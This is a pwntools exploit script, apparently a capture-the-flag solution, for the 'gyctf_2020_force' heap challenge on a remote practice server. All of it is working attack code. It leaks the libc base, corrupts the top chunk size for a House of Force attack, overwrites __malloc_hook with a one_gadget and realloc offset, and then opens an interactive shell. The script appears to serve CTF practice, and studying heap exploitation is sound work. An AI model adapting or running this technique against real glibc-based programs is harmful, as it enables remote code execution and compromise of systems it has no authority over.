from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('gyctf_2020_force')
io = remote('node4.buuoj.cn', 25894)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('gyctf_2020_force')


def add(size, content = ''):
	io.sendlineafter('2:puts\n', '1')
	io.sendlineafter('size\n', str(size))
	if content == '':
		return
	addr = int(io.recvline()[-15:-1], 16)
	io.sendlineafter('content\n', content)
	return addr

def leak_libc():
	global libc_base
	mmap = add(0x200000, 'aa')
	libc_base = mmap + 0x200ff0
	log.success('libc_base: ' + hex(libc_base))


def	house_of_force():
	global top_chunk
	payload = b'a' * 0x10 + p64(0) + p64(0xffffffffffffffff)
	top_chunk = add(0x18, payload) + 0x10
	log.success('top_chunk: ' + hex(top_chunk))


def pwn():
	__malloc_hook = libc_base + libc.sym['__malloc_hook']
	realloc = libc_base + libc.sym['realloc']
	# one_gadget = libc_base + 0x4527a 			# for local 
	one_gadget = libc_base + 0x4526a
	size = __malloc_hook - top_chunk - 0x30
	add(size, 'a')
	add(0x10, cyclic(8) + p64(one_gadget) + p64(realloc + 4))
	# gdb.attach(io)
	# pause()
	add(0x10)
	io.interactive()


if __name__ == '__main__':
	leak_libc()
	house_of_force()
	pwn()
 
